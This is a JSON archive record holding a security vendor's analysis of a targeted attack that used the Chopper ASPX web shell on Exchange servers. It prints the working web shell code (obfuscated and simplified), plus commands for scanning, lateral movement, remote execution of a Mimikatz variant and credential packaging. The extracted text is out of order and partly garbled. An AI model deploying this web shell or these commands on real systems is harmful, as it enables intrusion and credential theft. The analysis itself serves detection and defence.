{
    "id": "e725587e-5a69-41f7-90c3-adad2c5ee54e",
    "created_at": "2023-01-12T15:03:56.945747Z",
    "updated_at": "2025-03-27T02:05:33.92523Z",
    "deleted_at": null,
    "sha1_hash": "5acf634aa029d1a3310fae7d26420835dbf481f6",
    "title": "2021-01-29 - Chopper ASPX web shell used in targeted attack",
    "authors": "",
    "file_creation_date": "2022-05-28T16:01:25Z",
    "file_modification_date": "2022-05-28T16:01:25Z",
    "file_size": 131805,
    "plain_text": "# Chopper ASPX Web Shell Used in Targeted Attack\n\n**[trendmicro.com/en_us/research/21/a/targeted-attack-using-chopper-aspx-web-shell-exposed-via-managed.html](https://www.trendmicro.com/en_us/research/21/a/targeted-attack-using-chopper-aspx-web-shell-exposed-via-managed.html)**\n\nactors to avoid detection\n**User Activity Checking**\n\n\nJanuary 29, 2021\n\nFigure 1. A short script inserted by malicious\n\n\n[Once Chopper successfully infects a system, the malicious actor will issue a query user (quser) command in an attempt to identify the primary](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/quser)\nuser or those who are currently logged in as users in the system. Based on our observation, the quser command was used routinely\nthroughout the attack to determine active remote sessions.\n\nFigure 2. The quser command is used to identify\n\nactive remote sessions.\n**Deobfuscation technique**\n\nTo deploy its tools, it uses the _[expand command to extract package files dropped in the system.](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/expand)_\n\nexpand {filename}.ex_ {filename}.dat\n\nexpand {filename}.ex_ {filename}.exe\n\nWe saw a noticeable difference with this attack compared to other Chopper attacks — its use of the .dat file extension, which is commonly\nused for data storage purposes, such as in a user profile’s ntuser.dat. In this particular Chopper attack, the .dat files are used as executables.\n\n**Lateral movement**\n\nIt proceeded with copying the Chopper web shell into accessible shared folders in other hosts to gain access.\n\ncopy premium.aspx \"\\\\\n{hostname}\\d$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\15.1.2044\\scripts\\premium\n\nIt also scans for vulnerabilities across the network by using an installed tool, Hacktool.Win32.CATLIKE.A, and a legitimate cURL,\nC:\\temp\\curl.dat.\n\nIt specifically scans for web server-related vulnerabilities and password weaknesses in Apache Tomcat, Citrix, and phpMyAdmin applications.\n\n**Application/Port** **Command**\n\nOracle WebLogic curl.dat -v -H 'Content-Type: text/xml;charset=UTF-8' http://{ip address\\]:7001/wls-wsat/CoordinatorPortType\n\nOracle Console curl.dat -vv http://{ip address}:7001/console/j_security_check -d j_username={username}&j_password=\n{password}&submit=Login\"\n\nPHPMyAdmin curl.dat -vv --connect-timeout 2 {ip address}/phpmyadmin\n\nApache Tomcat s.dat -u http://{ip address}:8080/manager/html\n\n\n-----\n\nPorts\n\n\ns.dat -i 10.217.229.189 -p {ports}\n\n\n7001\n9095\n5556\n8080\n\nTable 1. Commands used to scan for web server-related vulnerabilities and passwords on certain applications and ports\n\n[We saw that this attack also uses the WMI command line (wmic) utility to perform remote process execution on other infected endpoints.](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic)\n\n**Execution of arbitrary commands via session id**\n\nSuccessful exploitation of CVE-2020-0688 gives Chopper access to system privileges. In one of the endpoints, it will drop and execute\n[Trojan.Win32.PRIVESC.A. This trojan requires to be run under a user with SeTcbPrivilege. It allows an attacker to see all Windows sessions](http://www.trendmicro.com/vinfo/tmr/?/us/threat-encyclopedia/malware/Trojan.Win32.PRIVESC.A)\nand can execute arbitrary commands on the session via session id.\n\nFigure 3. Examples of arbitrary commands being performed\n\non the session via session id\n**Discovery**\n\n[For its discovery, it uses typical Windows command-line tools such as nltest,](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)#:~:text=Nltest%20is%20a%20command%2Dline,Server%20Administration%20Tools%20(RSAT).) _[ping,](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961503(v=ws.11))_ _[whoami,](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771299(v=ws.11))_ _[netstat,](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961504(v=ws.11))_ _[net,](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems)_ _[nslookup, hostname, and](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/nslookup)_ _[tasklist,](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist)_\nwhich are commonly used in other attacks. In addition, a publicly available JoeWare domain tool called LG.exe, which is quite popular among\nattackers and domain admins alike, was installed and used in the attack.\n\n**Credential access**\n\nFor obtaining user credentials, the attackers used HackTool.MSIL.Mimikatz.AF, a modified version of the open-sourced application Mimikatz,\nusing the following parameters: x, xxx, xxxx, xxxasd.\n\nwmic /node:{ip address} process call create \"cmd.exe /c c:\\users\\mpBD6D42.dat xxxasd -pass > c:\\users\\23.txt\n\n**Collection**\n\nThe attackers use _[wevtutil.exe to query security-related events from a target username and export it as a q.txt file. For packaging stolen](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil)_\n[credentials and other logs, it uses the makecab command instead of a third-party application such as rar.exe.](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/makecab)\n\n   -    makecab a.txt > 111\n\n   -    makecab aaa2.txt >1\n\nThe attacker uses installed security components or applications as filenames to hide in plain sight.\n\n   -    C:\\Program Files\\Trend Micro\\ ams p.dat\n\n   -    C:\\Oracle\\Oracle.dat\n\n   -    C:\\Program Files\\McAfee\\MacAfee.dat\n\nThese suspicious activities were seen via our XDR solution, which helped us monitor observable attack techniques and provided critical\nsecurity alerts including anomalous file extension execution, remote execution via system tools, web shell-related activities, and potential\nexploit attacks.\n\n## Security recommendations\n\n\n-----\n\neb s e s ca be e bedded syste s a secu ty gaps suc as u e ab t es ttac e s o to de t y u e ab e app cat o s used\nin systems to exploit them and install web shells for remote code execution or data exfiltration.\n\nWe provide some security recommendations to ensure that enterprises and organizations can defend against web shell attacks:\n\n**Patch your systems and applications. Ensure proper vulnerability patches are applied for public-facing applications, such as Apache**\nTomcat, Oracle Web Logic Server, Microsoft Exchange Server, and PHPMyAdmin.\n**Implement strong passwords. Do not use the same password for multiple applications or websites. Use multi-factor authentication**\nwhenever possible and regularly update it.\n**[Check for static keys in the IIS web.config file. As observed on CVE-2020-0688, the use of static keys — as opposed to randomly](https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)**\ngenerated keys — can allow an attacker to execute arbitrary code by tricking the server into deserializing ViewState data.\n\nEnterprises and organizations should have comprehensive and efficient protection, detection, prevention, and remediation based on real-time,\nhigher-confidence alerts to protect critical data and operations from sophisticated attacks and threats. A consolidated view of all security\nsensors provides a single-pane-of-glass view that will promote quick and thorough investigation and response.\n\n## Trend Micro Solutions\n\n[Trend Micro’s comprehensive XDR solution applies the most effective expert analytics to the deep data sets collected from Trend Micro](https://www.trendmicro.com/en_us/business/products/detection-response/xdr.html)\nsolutions across the enterprise — including email, endpoints, servers, cloud workloads, and networks — making faster connections to identify\nand stop attacks. Powerful artificial intelligence (AI) and expert security analytics correlate data from customer environments and Trend Micro’s\nglobal threat intelligence to deliver fewer, higher-fidelity alerts, leading to better, early detection. One console with one source of prioritized,\noptimized alerts supported with guided investigation simplifies the steps needed to fully understand the attack path and impact on the\norganization.\n\n## Indicators of compromise\n\n**Filename** **Path** **SHA-256** **Detection** **No**\n\nss.exe C:\\temp\\ ee63b49aca1495a170ea7273316385b606f3fd2df1e48e9f4de0f241d98bd055 HackTool.Win32.CATLIKE.A Vu\nSc\n\n\nLG.exe C:\\temp\\\nC:\\hp\\\n\n\n5099264b16208d88c9bca960751f5e3de7a5420986fa0d7e2b2a6b16af3909e9 HackTool.Win32.JoeWare.A. Jo\nLo\nM\nto\n\n\nLG.dat C:\\hp\\ 5099264b16208d88c9bca960751f5e3de7a5420986fa0d7e2b2a6b16af3909e9 HackTool.Win32.JoeWare.A. Jo\nLo\nM\nto\n\n\nmpBD6D42.dat C:\\Users\nC:\\Perflogs\nC:\\hp\nC:\\temp\n\nAPT & Targeted Attacks\n\n\ne9be71848d1faa0c41db4c6a1e901747d98fb0b3cca027f8be85ea5e339b75e3 HackTool.MSIL.Mimikatz.AF M\n\n\nWe dissect a targeted attack that made use of the Chopper ASPX web shell (Backdoor.ASP.WEBSHELL.UWMANA).\n\nBy: Trend Micro January 29, 2021 Read time: ( words)\n\nContent added to Folio\n\nWeb shells, in their simplicity and straightforwardness, are highly potent when it comes to compromising systems and environments. These\nmalicious code pieces can be written in ASP, PHP, and JSP, or any script that can execute a system command with a parameter that can pass\nthrough the web. Web shells can be embedded on web servers and can be used by malicious actors to launch arbitrary code. In as little as 15\nbytes, web shells can enable remote administration of an infected machine or system. Threats such as this can be difficult to detect even with\nmultiple security layers — especially if they are not consolidated.\n\nIn this blog, we will dissect a targeted attack that made use of the Chopper ASPX web shell (detected by Trend Micro as\nBackdoor.ASP.WEBSHELL.UWMANA).\n\n\n-----\n\n## Technical Analysis\n\n**Initial access**\n\nBased on our investigation, the Chopper web shell is dropped via a system token, potentially via a Microsoft Exchange Server vulnerability.\n[One notable vulnerability in the Microsoft Exchange Server is CVE-2020-0688, a remote code execution bug. Microsoft issued a patch for this](https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)\nvulnerability in February 2020. However, the malicious actors behind this attack drop the Chopper web shell in the web directory folder to\nestablish persistence. Through the ASPX file, malicious actors can establish a foothold in affected public-facing Outlook Web App (OWA)\nservers and send remote commands through them.\n\nOutlook Web App (Web Directory) - D:\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\15.1.2044\\scripts\\premium\\premium.aspx\n\nThe attack features the following script:\n\n<%@ Page Language=\"Jscript\" Debug=true%>\n\n<%\n\nvar\na=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"UmVxdWVzdC5Gb3JtWyJjb21tYW5kIl0=\"));\n\nvar b=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"dW5zYWZl\"));\n\nvar c=eval(a,b);\n\neval(c,b);\n\n%>\n\nWhen simplified, the malicious script looks like this, with the eval being the executor and the Request.Form acquiring the parameter to be\nexecuted:\n\n<%@ Page Language=\"Jscript\"%><%eval(Request.Form[\"Command\"],\"unsafe\");%>\n\nWe’ve observed that in some cases, malicious actors insert this short script to avoid detection:\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-29 - Chopper ASPX web shell used in targeted attack.pdf"
    ],
    "report_names": [
        "2021-01-29 - Chopper ASPX web shell used in targeted attack.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535836,
    "ts_updated_at": 1743041133,
    "ts_creation_date": 1653753685,
    "ts_modification_date": 1653753685,
    "files": {
        "pdf": "https://archive.orkl.eu/5acf634aa029d1a3310fae7d26420835dbf481f6.pdf",
        "text": "https://archive.orkl.eu/5acf634aa029d1a3310fae7d26420835dbf481f6.txt",
        "img": "https://archive.orkl.eu/5acf634aa029d1a3310fae7d26420835dbf481f6.jpg"
    }
}